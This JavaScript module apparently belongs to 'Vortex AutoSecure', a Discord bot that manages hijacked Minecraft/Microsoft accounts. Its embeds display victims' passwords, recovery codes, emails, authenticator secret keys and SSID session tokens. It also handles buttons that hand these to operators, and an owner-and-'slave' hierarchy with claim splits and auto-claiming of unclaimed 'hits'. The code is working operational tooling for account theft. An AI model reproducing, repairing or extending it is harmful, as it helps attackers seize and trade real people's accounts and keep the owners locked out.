const { Client, EmbedBuilder } = require('discord.js');
const { queryParams } = require("../../db/database");
const { footer } = require("../../config.json")
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const generate = require("../../autosecure/utils/utils/generate");

const COLOR = 0x9b7cff;
const FOOTER = { text: "Powered by Vortex AutoSecure" };

async function checkNotifications(client) {
  const delay = Date.now() - (15 * 60 * 1000);

  try {
    const rows = await client.queryParams(
      `SELECT * FROM notifications WHERE checked = 0 AND time < ?`,
      [delay]
    );

    for (const notification of rows) {
      try {
        if (notification.checked === 0 && notification.time < delay) {
          const user = await client.users.fetch(notification.userid).catch(() => null);
          if (!user) continue;

          const owner = notification.id.split("|")[0];
          const slave = notification.userid;

          const embed = new EmbedBuilder()
            .setColor(COLOR)
            .setTitle("🔔 Settings Updated")
            .setDescription(
              `Your **AutoSecure permissions & configuration** were updated by:\n\n` +
              `> <@${owner}>\n\n` +
              "If you believe this change is incorrect, contact your owner."
            )
            .setFooter(FOOTER);

          await user.send({ embeds: [embed] });

          const permsembed = await sendpermissionsembed(client, owner, slave);
          if (permsembed) {
            await user.send(permsembed);
          }

          await client.queryParams(
            `UPDATE notifications SET checked = 1 WHERE id = ?`,
            [notification.id],
            "run"
          );
        }
      } catch {}
    }
  } catch (err) {
    console.error("Vortex querying notifications:", err);
  }
}


async function addnotification(client, userid) {
  let id = `${client.username}|${client.botnumber}`;
  let time = Date.now();
  let checked = 0;

  const existing = await client.queryParams(`SELECT 1 FROM notifications WHERE id = ?`, [id]);

  if (existing.length > 0) {
    await client.queryParams(
      `UPDATE notifications SET userid = ?, time = ?, checked = ? WHERE id = ?`,
      [userid, time, checked, id]
    );
  } else {
    await client.queryParams(
      `INSERT INTO notifications (id, userid, time, checked) VALUES (?, ?, ?, ?)`,
      [id, userid, time, checked]
    );
  }
}


async function sendpermissionsembed(client, owner, slave) {
  let embed = new EmbedBuilder()
    .setTitle("🛡️ User Permissions Overview")
    .setColor(COLOR)
    .setFooter(FOOTER);

  let usersQuery;
  let queryParams1;
  let isOwner = owner === owner;

  usersQuery = `SELECT * FROM users WHERE user_id=?`;
  queryParams1 = [owner];

  let users = await client.queryParams(usersQuery, queryParams1);

  if (users.length === 0) {
    embed.setDescription("❌ No users found under your control.");
  } else {
    let currentUser = users.find(u => u.child === slave);

    if (!currentUser) {
      embed.setDescription("⚠️ User not registered under your account.");
    } else {
      let claimingStatus =
        currentUser.claiming == 1 ? "Full" :
        currentUser.claiming == 0 ? "SSID" : "Disabled";

      let restcurrent =
        currentUser.rest == 0 ? 'SSID' :
        currentUser.rest == -1 ? 'Nothing' :
        currentUser.rest == 1 ? 'Full' : 'Unknown';

      embed.setDescription(`👤 **Target User:** <@${currentUser.child}>`);

      embed.addFields(
        { name: "🔓 Claim Type", value: claimingStatus, inline: true },
        { name: "📊 Claim Split", value: `1/${currentUser.split}`, inline: true },
        { name: "⚙️ Rest Mode", value: restcurrent, inline: true },

        { name: "Edit Features", value: currentUser.editfeatures ? "✅ Enabled" : "❌ Disabled", inline: true },
        { name: "Edit Settings", value: currentUser.editsettings ? "✅ Enabled" : "❌ Disabled", inline: true },
        { name: "Edit Claiming", value: currentUser.editclaiming ? "✅ Enabled" : "❌ Disabled", inline: true },
        { name: "Edit Responses", value: currentUser.editresponses ? "✅ Enabled" : "❌ Disabled", inline: true },
        { name: "Stats Buttons", value: currentUser.usestatsbutton ? "✅ Enabled" : "❌ Disabled", inline: true },
        { name: "DM Buttons", value: currentUser.usedmbuttons ? "✅ Enabled" : "❌ Disabled", inline: true },
      );
    }
  }

  return { embeds: [embed] };
}


async function mainclaimembed(client) {
  let embed = new EmbedBuilder()
    .setColor(COLOR)
    .setTitle("📦 Unclaimed Accounts Panel")
    .setDescription(
      "**Manage all pending unclaimed accounts below.**\n\n" +
      "• Configure auto-claim delay\n" +
      "• Receive accounts after timed release\n" +
      "• Track ownership history\n\n" +
      "⚠️ These actions are logged & visible to your sub-users."
    )
    .setFooter(FOOTER);

  const components = [
    new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('autoclaim')
        .setLabel('Change Auto-Claim Delay')
        .setStyle(ButtonStyle.Primary)
    )
  ];

  return { embeds: [embed], components };
}


async function sendclaimownerembed(client, currentPage) {
  const unclaimedHits = await client.queryParams(
    "SELECT * FROM unclaimed WHERE user_id = ? ORDER BY date DESC",
    [client.username]
  );

  const uniqueHits = new Map();

  for (const row of unclaimedHits) {
    const data = JSON.parse(row.data);
    const { uid, acc, mcname } = data;
    if (!uniqueHits.has(uid)) {
      uniqueHits.set(uid, { uid, acc, mcname, date: row.date });
    }
  }

  const hitsArray = Array.from(uniqueHits.values());
  const pageSize = 1;
  const totalPages = Math.max(1, Math.ceil(hitsArray.length / pageSize));

  const isMainPage = currentPage === 0 || currentPage === "0";
  const page = isMainPage ? 0 : Math.max(1, Math.min(Number(currentPage), totalPages));

  let embed;
  let components = [];

  if (page === 0) {
    const baseEmbed = await mainclaimembed(client);
    embed = baseEmbed.embeds[0];
    components = baseEmbed.components;
  } else {
    const hit = hitsArray[page - 1];
    if (hit) {
      const securedAgo = `<t:${hit.date}:R>`;

      embed = new EmbedBuilder()
        .setColor(COLOR)
        .setTitle(`🔐 Account Secured Successfully`)
        .setDescription(`**Secured:** ${securedAgo}`)
        .addFields(
          { name: "Username", value: `\`${hit.acc.oldName}\``, inline: true },
          { name: "Owns MC", value: `\`${hit.acc.mc}\``, inline: true },
          { name: "Capes", value: Array.isArray(hit.acc.capes) && hit.acc.capes.length ? hit.acc.capes.join(", ") : "None", inline: true },
          { name: "Recovery Code", value: `\`${hit.acc.recoveryCode}\``, inline: false },
          { name: "Primary Email", value: `\`${hit.acc.email}\``, inline: true },
          { name: "Security Email", value: `\`${hit.acc.secEmail}\``, inline: true },
          { name: "Secret Key", value: `\`${hit.acc.secretkey}\``, inline: true },
          { name: "Password", value: `\`${hit.acc.password}\``, inline: false }
        )
        .setFooter(FOOTER);

      const ssidId = generate(32);

      await client.queryParams(
        `INSERT INTO actions(id, action) VALUES(?, ?)`,
        [ssidId, `ssid|${hit.acc.ssid || ""}${hit.acc.xbl ? `|${hit.acc.xbl}` : ""}`]
      );

      components.push(
        new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId("ssid|" + ssidId).setLabel("SSID").setStyle(ButtonStyle.Primary),
          new ButtonBuilder().setCustomId(`minecraft|${hit.uid}`).setLabel("Minecraft").setStyle(ButtonStyle.Primary),
          new ButtonBuilder().setCustomId(`email|${hit.acc.secEmail}`).setEmoji("📧").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId(`auth|${hit.acc.secretkey}`).setEmoji("🔑").setStyle(ButtonStyle.Secondary),
          new ButtonBuilder().setCustomId(`extrainformation|${hit.uid}`).setEmoji("🔗").setStyle(ButtonStyle.Success)
        )
      );
    }
  }

  return { embeds: [embed], components, ephemeral: true };
}


module.exports = {
  initializeNotificationSystem: (client, interval = 30000) => {
    checkNotifications(client);
    return setInterval(() => checkNotifications(client), interval);
  },
  checkNotifications,
  addnotification,
  sendpermissionsembed,
  sendclaimownerembed
};
